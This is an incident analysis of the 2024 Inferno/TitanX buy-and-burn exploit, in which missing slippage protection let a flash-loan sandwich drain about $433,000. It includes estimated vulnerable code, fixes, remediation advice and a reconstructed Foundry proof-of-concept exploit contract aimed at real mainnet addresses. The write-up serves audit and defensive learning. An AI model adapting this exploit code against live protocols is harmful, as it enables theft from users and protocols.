# Inferno — Missing Slippage Protection Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-09-16 (based on first report date; slight discrepancy with user-provided date 2024-09-11) |
| **Protocol** | Inferno (InfernoBuyAndBurn) / TitanX Ecosystem |
| **Chain** | Ethereum (ETH Mainnet) |
| **Loss** | ~$433,000 (~5,026,609,611 TITANX; some sources report $440,000) |
| **Attacker** | [0xb84a...d819](https://etherscan.io/address/0xb84a1224A43121Ea9FfBED8cE3baF0F4b280d819) |
| **Attack Contract** | `to` address of attack TX: [0x96Ca...fA78](https://etherscan.io/address/0x96Ca744CDE8c9a985eC61682314585bB35aAfA78) (InfernoBuyAndBurn) |
| **Attack Tx** | [0xaba8...b0](https://etherscan.io/tx/0xaba8b611d53f548f7158f753ef6344084d0514b6c6053080dbfb710134974fb0) |
| **Vulnerable Contract** | [0x96Ca...fA78](https://etherscan.io/address/0x96Ca744CDE8c9a985eC61682314585bB35aAfA78) (InfernoBuyAndBurn, source unverified) |
| **Root Cause** | `amountBlazeMin = 0` in `swapTitanXForInfernoAndBurn()` — missing slippage protection forces swap execution at manipulated price |
| **PoC Source** | Not listed in DeFiHackLabs (see learnblockchain.cn analysis) |

---

## 1. Vulnerability Overview

Inferno is a deflationary token within the TitanX ecosystem, with the `InfernoBuyAndBurn` contract responsible for the core Buy-and-Burn mechanism. When `swapTitanXForInfernoAndBurn()` is called externally, this contract executes the following sequence:

1. Swap TITANX → BLAZE on Uniswap V2 TITANX-BLAZE pool
2. Swap BLAZE → INF on Uniswap V3 BLAZE-INF pool
3. Burn INF tokens and pay TITANX incentives to the caller

The issue is that **setting the slippage parameter `amountBlazeMin` to `0`** causes the swap to execute without any validation. The attacker manipulated the TITANX-BLAZE pool price by 123.6% using a flash loan, then called this function, forcing the protocol to sell TITANX at an extremely unfavorable exchange rate. The attacker extracted approximately $433,000 worth of TITANX through this arbitrage (sandwich attack structure).

This incident demonstrates that Buy-and-Burn style automated burn mechanisms deployed with **publicly accessible + zero slippage validation** structure are completely exposed to flash loan sandwich attacks.

---

## 2. Vulnerable Code Analysis

### 2.1 `swapTitanXForInfernoAndBurn()` — Missing Slippage Validation (Core Vulnerability)

**Vulnerable code (estimated — InfernoBuyAndBurn source unverified)**:
```solidity
// InfernoBuyAndBurn.sol — estimated vulnerable swapTitanXForInfernoAndBurn() implementation

// ❌ Public function callable by anyone — no access control
function swapTitanXForInfernoAndBurn(
    uint256 amountTitanX,
    uint256 amountBlazeMin,   // ❌ unconditionally accepts if caller passes 0
    uint256 amountInfMin      // ❌ likewise unguarded if 0 is passed
) external {
    // Step 1: Swap TITANX → BLAZE on Uniswap V2 TITANX-BLAZE pool
    // ❌ amountBlazeMin is 0 so swap executes even at manipulated price
    uint256 blazeReceived = _swapV2(
        address(TITANX),
        address(BLAZE),
        amountTitanX,
        amountBlazeMin    // ← attacker sets to 0 → unlimited slippage allowed
    );

    // Step 2: Swap BLAZE → INF on Uniswap V3 BLAZE-INF pool
    uint256 infReceived = _swapV3(
        address(BLAZE),
        address(INF),
        blazeReceived,
        amountInfMin      // ← likewise unlimited if 0
    );

    // Step 3: Burn INF tokens and pay TITANX incentives to caller
    INF.burn(infReceived);
    // ❌ Incentive calculation depends on swap result → manipulated result can cause excessive incentive payout
    uint256 incentive = _calculateIncentive(amountTitanX);
    TITANX.transfer(msg.sender, incentive);
}
```

**Fixed code**:
```solidity
// ✅ Implementation with slippage protection and access control added

// TWAP oracle or on-chain price reference variable
ITWAPOracle public priceOracle;
uint256 public constant MAX_SLIPPAGE_BPS = 100; // max 1% slippage allowed

function swapTitanXForInfernoAndBurn(
    uint256 amountTitanX,
    uint256 amountBlazeMin,
    uint256 amountInfMin
) external {
    // ✅ Enforce minimum slippage value: at least 99% of TWAP-based expected value
    uint256 expectedBlaze = priceOracle.getAmountOut(
        address(TITANX), address(BLAZE), amountTitanX
    );
    uint256 safeMinBlaze = expectedBlaze * (10000 - MAX_SLIPPAGE_BPS) / 10000;

    // ✅ Use the stricter of caller-provided value vs internally calculated value
    uint256 effectiveMinBlaze = amountBlazeMin > safeMinBlaze
        ? amountBlazeMin
        : safeMinBlaze;

    require(effectiveMinBlaze > 0, "SlippageProtection: minBlaze must be > 0");

    uint256 blazeReceived = _swapV2(
        address(TITANX),
        address(BLAZE),
        amountTitanX,
        effectiveMinBlaze   // ✅ TWAP-based minimum received amount enforced
    );

    // ✅ Apply same protection to BLAZE→INF swap
    uint256 expectedInf = priceOracle.getAmountOut(
        address(BLAZE), address(INF), blazeReceived
    );
    uint256 effectiveMinInf = expectedInf * (10000 - MAX_SLIPPAGE_BPS) / 10000;

    uint256 infReceived = _swapV3(
        address(BLAZE),
        address(INF),
        blazeReceived,
        effectiveMinInf     // ✅ Minimum INF received amount also validated
    );

    INF.burn(infReceived);
    uint256 incentive = _calculateIncentive(amountTitanX);
    TITANX.transfer(msg.sender, incentive);
}
```

**Issue**: When called with `amountBlazeMin = 0`, the Uniswap AMM executes the swap regardless of how unfavorable the exchange rate is. If the attacker calls this function immediately after artificially inflating the BLAZE price in the TITANX-BLAZE pool by 123.6% using a flash loan, the protocol receives only a tiny amount of BLAZE while the swap is treated as successful. As a result, the protocol's funds (TITANX) are depleted at an extremely unfavorable rate, and the attacker captures the arbitrage by reverting the manipulation.

### 2.2 Publicly Accessible Burn Trigger Function

**Vulnerable code (estimated)**:
```solidity
// ❌ Can be called by anyone at any arbitrary time without authorization
// Structure allows attacker to call immediately after price manipulation
function swapTitanXForInfernoAndBurn(...) external {
    // Executes swap using internal protocol funds
}
```

**Fixed code**:
```solidity
// ✅ Only trusted callers allowed (or minimum wait time applied)
modifier onlyAuthorizedCaller() {
    require(
        authorizedCallers[msg.sender] || msg.sender == owner(),
        "BuyAndBurn: caller not authorized"
    );
    _;
}

// ✅ Or enforce minimum block interval (flash loans execute within 1 block, so this provides defense)
uint256 public lastBurnBlock;
modifier cooldown() {
    require(block.number > lastBurnBlock + MIN_BLOCK_INTERVAL, "BuyAndBurn: cooldown active");
    lastBurnBlock = block.number;
    _;
}

function swapTitanXForInfernoAndBurn(...) external onlyAuthorizedCaller cooldown {
    // ...
}
```

**Issue**: When the Buy-and-Burn function is publicly open, an attacker can call it immediately within the same transaction (or same block) after price manipulation, making it the entry point for slippage manipulation attacks.

---

## 3. Attack Flow

### 3.1 Preparation Phase

The attacker borrows approximately 510,181,931,258 TITANX uncollateralized via a flash loan from the Uniswap V3 TITANX pool. This amount is large enough relative to the TITANX-BLAZE V2 pool's liquidity to manipulate the price by more than 2x.

### 3.2 Execution Phase

1. **Flash loan initiation**: Borrow 510,181,931,258 TITANX from Uniswap V3 TITANX pool (recipient: Uniswap V2 TITANX-BLAZE pool)
2. **Direct TITANX transfer**: Deposit 18,000,000,000 TITANX directly into the Uniswap V2 TITANX-BLAZE pool to prepare for pool ratio manipulation
3. **BLAZE price manipulation (buy)**: Swap to acquire BLAZE from TITANX-BLAZE pool → BLAZE/TITANX price spikes from 9,230,016 → 20,641,436 (+123.6%)
4. **Vulnerable function call**: Call `InfernoBuyAndBurn.swapTitanXForInfernoAndBurn(amountBlazeMin=0)`
   - Protocol receives only 385.871 BLAZE for 7,964,945,360 TITANX (at manipulated rate)
   - Swap BLAZE → 467,720,154 INF, then burn INF
   - 121,293,584 TITANX paid as incentive to attacker's contract
5. **BLAZE price restoration (sell)**: Re-swap held BLAZE back to TITANX to normalize pool price
6. **Profit realization**: Capture TITANX differential generated from the manipulation → restoration cycle
7. **Flash loan repayment**: Return borrowed TITANX to V3 pool (including fee)

### 3.3 Attack Flow Diagram

```
┌────────────────────────────────────────────┐
│            Attacker EOA                     │
│  0xb84a1224A43121Ea9FfBED8cE3baF0F4b280d819 │
└──────────────────────┬─────────────────────┘
                       │ ① Send attack transaction
                       ▼
┌────────────────────────────────────────────┐
│       Uniswap V3: TITANX Pool              │
│  (Flash loan provider)                      │
└──────────────────────┬─────────────────────┘
                       │ ② Lend 510,181,931,258 TITANX
                       │    (recipient: TITANX-BLAZE V2 pool)
                       ▼
┌────────────────────────────────────────────┐
│    Uniswap V2: TITANX-BLAZE Pool           │
│  (Price manipulation target)                │
│                                            │
│  Before: TITANX/BLAZE = 9,230,016         │
│  ③ Direct transfer of 18B TITANX → pool ratio changes    │
│  ④ Acquire ~57,224 BLAZE via swap →       │
│     Price surges to 20,641,436 (+123.6%)   │
└──────────────────────┬─────────────────────┘
                       │ ⑤ With price in manipulated state
                       ▼
┌────────────────────────────────────────────┐
│    InfernoBuyAndBurn Contract              │
│  0x96Ca744CDE8c9a985eC61682314585bB35aAfA78 │
│                                            │
│  ⑥ swapTitanXForInfernoAndBurn(            │
│       amountTitanX = 7,964,945,360,        │
│       amountBlazeMin = 0  ← ❌ vulnerability│
│     )                                      │
│                                            │
│  7.96B TITANX → only 385.871 BLAZE        │
│  (at manipulated price, extremely unfavorable rate)      │
│                                            │
│  385.871 BLAZE → 467,720,154 INF burned   │
│  Incentive: 121,293,584 TITANX → attacker │
└──────────────────────┬─────────────────────┘
                       │ ⑦ Price manipulation reversal
                       ▼
┌────────────────────────────────────────────┐
│    Uniswap V2: TITANX-BLAZE Pool           │
│                                            │
│  ⑦ Held BLAZE → re-swap to TITANX         │
│     Price normalized (profit capture window)│
└──────────────────────┬─────────────────────┘
                       │ ⑧ Repay flash loan principal + fee
                       ▼
┌────────────────────────────────────────────┐
│       Uniswap V3: TITANX Pool              │
│  (Flash loan repayment complete)            │
└────────────────────────────────────────────┘
                       │
                       ▼
        Attacker net profit: 5,026,609,611 TITANX
        (≈ $433,000 ~ $440,000)
        — of which 121,293,584 TITANX is legitimate incentive
        — remainder is sandwich arbitrage profit
```

### 3.4 Outcome

- **Attacker profit**: 5,026,609,611 TITANX (approximately $433,000 ~ $440,000)
- **Protocol loss**: Large-scale TITANX drain from InfernoBuyAndBurn contract and abnormal INF token burn
- **Attack duration**: Single transaction (completed within 1 block via flash loan)

---

## 4. PoC Code (Reconstructed — Not Listed in DeFiHackLabs)

> Note: No official PoC file exists in the DeFiHackLabs repository. The following is a reconstructed example based on the public analysis at learnblockchain.cn/article/9538.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo
// Total Loss: ~$433,000 (5,026,609,611 TITANX)
// Attacker: https://etherscan.io/address/0xb84a1224A43121Ea9FfBED8cE3baF0F4b280d819
// Vulnerable Contract: https://etherscan.io/address/0x96Ca744CDE8c9a985eC61682314585bB35aAfA78
// Attack Tx: https://etherscan.io/tx/0xaba8b611d53f548f7158f753ef6344084d0514b6c6053080dbfb710134974fb0
// Analysis Source: https://learnblockchain.cn/article/9538

// TITANX token (ERC-20)
address constant TITANX_ADDR  = 0xf19308F923582A6f7c465e5CE7a9Dc1BEC6665B1;
// BLAZE token
address constant BLAZE_ADDR   = 0xfcd7cCeE4071aA4eCFAC1683b7CC0aFecaF42a36;
// INFERNO token
address constant INF_ADDR      = 0x00F116ac0c304C570daAA68FA6c30a86A04B5C5F;
// WETH
address constant WETH_ADDR     = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
// InfernoBuyAndBurn contract (vulnerable target)
address constant INFERNO_BAB   = 0x96Ca744CDE8c9a985eC61682314585bB35aAfA78;
// Uniswap V2 TITANX-BLAZE pool (price manipulation target)
address constant TITANX_BLAZE_V2 = 0x4D3A10d4792Dd12ececc5F3034C8e264B28485d1;
// Uniswap V3 TITANX pool (flash loan source)
address constant TITANX_V3_POOL  = 0x7c10850718f2346e317E10FcF67D64f2860C91a2;

interface IInfernoBuyAndBurn {
    // ❌ Vulnerable function: passing amountBlazeMin as 0 executes without slippage validation
    function swapTitanXForInfernoAndBurn(
        uint256 amountTitanX,
        uint256 amountBlazeMin,  // ← vulnerability triggers when set to 0
        uint256 amountInfMin
    ) external;
}

contract InfernoExploitPoC is Test {
    IERC20 titanx  = IERC20(TITANX_ADDR);
    IERC20 blaze   = IERC20(BLAZE_ADDR);
    IUniswapV3Pool v3Pool = IUniswapV3Pool(TITANX_V3_POOL);

    function setUp() public {
        // Fork Ethereum mainnet at block immediately before attack
        // Attack block: block of attack Tx (based on 2024-09-16)
        vm.createSelectFork("mainnet");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "[Start] Attacker TITANX balance",
            titanx.balanceOf(address(this)),
            18
        );

        // ① Request flash loan from Uniswap V3
        // Borrow 510,181,931,258 TITANX uncollateralized
        // Set recipient to TITANX-BLAZE V2 pool → direct deposit effect
        v3Pool.flash(
            TITANX_BLAZE_V2,                 // recipient: V2 pool (direct liquidity manipulation)
            510_181_931_258 * 1e18,          // TITANX borrow amount
            0,                               // no WETH borrowed
            abi.encode(uint256(0))           // callback data
        );

        emit log_named_decimal_uint(
            "[Complete] Attacker final TITANX profit",
            titanx.balanceOf(address(this)),
            18
        );
    }

    // Uniswap V3 flash loan callback
    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata data
    ) external {
        // ② TITANX already transferred to V2 pool
        // Additionally transfer 18B TITANX directly to V2 pool (pre-sync state manipulation)
        titanx.transfer(TITANX_BLAZE_V2, 18_000_000_000 * 1e18);

        // ③ Acquire BLAZE via swap from V2 pool → manipulate pool price
        // BLAZE/TITANX price: 9,230,016 → 20,641,436 (+123.6%)
        IUniswapV2Pair(TITANX_BLAZE_V2).swap(
            57_224 * 1e18,  // BLAZE amount to receive (~57,224 BLAZE)
            0,              // TITANX amount to receive
            address(this),
            ""
        );

        emit log_named_decimal_uint(
            "[Step 3] BLAZE received after price manipulation",
            blaze.balanceOf(address(this)),
            18
        );

        // ④ Core attack: call vulnerable InfernoBuyAndBurn function
        // Set amountBlazeMin = 0 → completely disables slippage protection
        // Protocol depletes 7.96B TITANX at manipulated price and receives minimal BLAZE
        IInfernoBuyAndBurn(INFERNO_BAB).swapTitanXForInfernoAndBurn(
            7_964_945_360 * 1e18, // TITANX amount for swap
            0,                    // ❌ amountBlazeMin = 0 → unlimited slippage allowed
            0                     // ❌ amountInfMin = 0 → second step also unguarded
        );
        // Incentive of 121,293,584 TITANX transferred to address(this)

        // ⑤ Reverse manipulation: re-swap held BLAZE back to TITANX (realize profit)
        // Profit captured from price differential as V2 pool price normalizes
        blaze.transfer(TITANX_BLAZE_V2, blaze.balanceOf(address(this)));
        IUniswapV2Pair(TITANX_BLAZE_V2).swap(
            0,
            _calculateTitanXOut(),  // receive TITANX via price-restoration swap
            address(this),
            ""
        );

        // ⑥ Repay flash loan: return borrowed principal + V3 fee
        uint256 repayAmount = 510_181_931_258 * 1e18 + fee0;
        titanx.transfer(TITANX_V3_POOL, repayAmount);

        // Net profit: 5,026,609,611 TITANX (sandwich arbitrage + incentive)
    }

    function _calculateTitanXOut() internal view returns (uint256) {
        // Calculate expected TITANX received after restoration swap (simplified)
        return titanx.balanceOf(TITANX_BLAZE_V2) * 997 / 1000;
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE |
|----|--------|--------|-----|
| V-01 | Missing slippage protection (`amountBlazeMin = 0` allowed) | CRITICAL | CWE-20 (Improper Input Validation) |
| V-02 | Publicly accessible internal burn trigger (missing access control) | HIGH | CWE-284 (Improper Access Control) |
| V-03 | Reliance on single AMM spot price (no TWAP usage) | HIGH | CWE-691 (Insufficient Control Flow Management) |

### V-01: Missing Slippage Protection

- **Description**: The `swapTitanXForInfernoAndBurn()` function controls slippage via the `amountBlazeMin` parameter, but there is no minimum value validation preventing this from being set to `0`. Uniswap AMM allows swaps at any exchange rate when `amountOutMin = 0`.
- **Impact**: If an attacker calls this function with `amountBlazeMin = 0` immediately after manipulating the TITANX-BLAZE pool price via a flash loan, large amounts of TITANX held by the protocol are depleted at an extremely unfavorable rate, with the arbitrage profit accruing to the attacker. Loss of approximately $433,000.
- **Attack conditions**: (1) Able to pass `amountBlazeMin = 0` to the function, (2) TITANX-BLAZE V2 pool liquidity level is susceptible to flash loan price manipulation.

### V-02: Missing Access Control

- **Description**: `swapTitanXForInfernoAndBurn()` is the core execution function of the Buy-and-Burn mechanism, yet it is exposed as `external` visibility allowing anyone to call it at any arbitrary time. There is no whitelist caller, `onlyOwner`, or block-level cooldown.
- **Impact**: An attacker can call it immediately within the same transaction right after price manipulation, forcing an unfavorable swap execution at the manipulated state.
- **Attack conditions**: Function is exposed as `external` or `public`.

### V-03: AMM Spot Price Dependency

- **Description**: The protocol relies solely on the instantaneous (spot) price of a single AMM when executing swaps, without referencing a TWAP (Time-Weighted Average Price) oracle or external price feed.
- **Impact**: Flash loan manipulation of the instantaneous price causes the protocol to treat an abnormal exchange rate as normal. Using TWAP dilutes the impact that within-a-single-block manipulation has on the price.
- **Attack conditions**: No TWAP oracle exists and only AMM `getReserves()`-based spot price is used.

---

## 6. Remediation Recommendations

### Immediate Actions

**① Block `amountBlazeMin = 0` — Strengthen input validation**

```solidity
// Before (vulnerable)
function swapTitanXForInfernoAndBurn(
    uint256 amountTitanX,
    uint256 amountBlazeMin,  // allows 0 → unlimited slippage
    uint256 amountInfMin
) external {
    // Swap executes immediately without validation
}

// After (safe)
function swapTitanXForInfernoAndBurn(
    uint256 amountTitanX,
    uint256 amountBlazeMin,
    uint256 amountInfMin
) external {
    // ✅ Block zero slippage parameters
    require(amountBlazeMin > 0, "BuyAndBurn: amountBlazeMin must be > 0");
    require(amountInfMin > 0, "BuyAndBurn: amountInfMin must be > 0");

    // ✅ Also enforce TWAP-based minimum simultaneously (apply stricter value)
    uint256 twapBasedMin = _getTWAPMinBlaze(amountTitanX);
    uint256 effectiveMin = amountBlazeMin > twapBasedMin ? amountBlazeMin : twapBasedMin;

    _swapV2(address(TITANX), address(BLAZE), amountTitanX, effectiveMin);
    // ...
}
```

**② Add access control — Allow only trusted callers**

```solidity
// Before (vulnerable)
function swapTitanXForInfernoAndBurn(...) external { ... }

// After (safe) — Option A: Whitelist-based
mapping(address => bool) public authorizedCallers;

function swapTitanXForInfernoAndBurn(...) external {
    require(authorizedCallers[msg.sender], "BuyAndBurn: unauthorized caller");
    // ...
}

// After (safe) — Option B: Block cooldown (flash loan defense)
uint256 public lastExecutedBlock;
uint256 public constant COOLDOWN_BLOCKS = 10;

function swapTitanXForInfernoAndBurn(...) external {
    require(
        block.number >= lastExecutedBlock + COOLDOWN_BLOCKS,
        "BuyAndBurn: cooldown period active"
    );
    lastExecutedBlock = block.number;
    // ...
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| Missing slippage protection | Enforce `amountOutMin > 0` validation + compute TWAP oracle-based minimum in parallel |
| Missing public access control | Introduce whitelist keeper addresses or block cooldown mechanism |
| AMM spot price dependency | Integrate Uniswap V3 TWAP or Chainlink price feed to establish manipulation-resistant price reference |
| Buy-and-Burn design | Hardcode a maximum slippage constant (e.g., 2%) for automated execution as a preset safety net |
| Lack of monitoring | Build pool price spike detection + abnormal swap alerting system |

---

## 7. Lessons Learned

1. **Never use `amountOutMin = 0` in production code**: When a slippage parameter is `0`, the AMM allows swaps at any arbitrary rate. A realistic minimum must be enforced for all functions where a protocol executes swaps using its own funds — including Buy-and-Burn, harvest, and compound functions.

2. **Public burn/operational triggers are targets for flash loan sandwiches**: When automated burn mechanisms such as Buy-and-Burn can be called by anyone at any time, an attacker can trigger them immediately after price manipulation. Whitelist-based keepers or block cooldowns must be used to restrict call frequency.

3. **Single AMM spot price dependency is vulnerable to flash loans**: When a protocol's swap logic depends on `getReserves()`-based spot prices, it is possible to manipulate prices by hundreds of percent within a single transaction using a flash loan. Using a TWAP oracle (minimum of several dozen blocks average) substantially reduces the impact of instantaneous manipulation.

4. **Burn mechanisms in deflationary tokens are mandatory audit targets**: Designs that pay incentives to trigger burns create structures favorable to economic attacks. The execution conditions of burn functions, incentive calculation formulas, and price reference methods are all within audit scope.

5. **The assumption that "funds earmarked for burning are safe" is incorrect**: Even funds intended for Buy-and-Burn can have their arbitrage profit extracted by an attacker during the swap process. Funds designated for burning are still subject to theft without slippage protection during swaps.

---

## 8. On-Chain Verification

### 8.1 PoC vs On-Chain Amount Comparison

| Item | Analyzed Value | On-Chain Reference | Notes |
|------|---------|-------------|------|
| Flash loan size | 510,181,931,258 TITANX | 510B+ TITANX (estimated) | Borrowed from Uniswap V3 |
| BLAZE price before manipulation | TITANX/BLAZE = 9,230,016 | — | learnblockchain.cn analysis |
| BLAZE price after manipulation | TITANX/BLAZE = 20,641,436 | — | +123.6% surge |
| Protocol TITANX consumed | 7,964,945,360 TITANX | — | Swapped at manipulated rate |
| BLAZE received | 385.871 BLAZE | — | Extremely small amount received |
| Incentive | 121,293,584 TITANX | — | Within normal incentive range |
| Total attacker profit | 5,026,609,611 TITANX | ~$433,000 | Sandwich arbitrage + incentive |

### 8.2 On-Chain Event Log Sequence (Estimated)

```
1. UniswapV3Pool.flash() called → flash loan initiated
2. TITANX.transfer(TITANX_BLAZE_V2, 18B) → direct transfer to V2 pool
3. UniswapV2Pair(TITANX-BLAZE).swap() → acquire BLAZE, manipulate price
4. InfernoBuyAndBurn.swapTitanXForInfernoAndBurn(amountBlazeMin=0) called
   ├── UniswapV2: TITANX → 385.871 BLAZE (at manipulated rate)
   ├── UniswapV3: BLAZE → 467,720,154 INF
   ├── INF.burn()
   └── TITANX.transfer(attacker, 121,293,584) ← incentive paid
5. UniswapV2Pair.swap() → BLAZE → TITANX re-swap (price restoration + profit capture)
6. TITANX.transfer(v3Pool, repayAmount) → flash loan repayment
```

### 8.3 Precondition Verification

- **Flash loan required**: Without large-scale capital of approximately 500M TITANX, it is impossible to manipulate the TITANX-BLAZE V2 pool price by more than 2x
- **InfernoBuyAndBurn contract**: Source unverified (Etherscan unverified); actual vulnerable function signature is estimated via bytecode analysis
- **On-chain verification status**: Attack transaction hash `0xaba8b611...` confirmed on Etherscan. `from: 0xb84a1224...`, `to: 0x96Ca744...` (InfernoBuyAndBurn) confirmed. Detailed trace omitted as `cast` was not executed.

---

*Document date: 2026-04-11 | Analysis basis: learnblockchain.cn/article/9538, Etherscan on-chain data*
*Reference: [TITANX: The Tragedy of the Forced Investment Incident](https://learnblockchain.cn/article/9538)*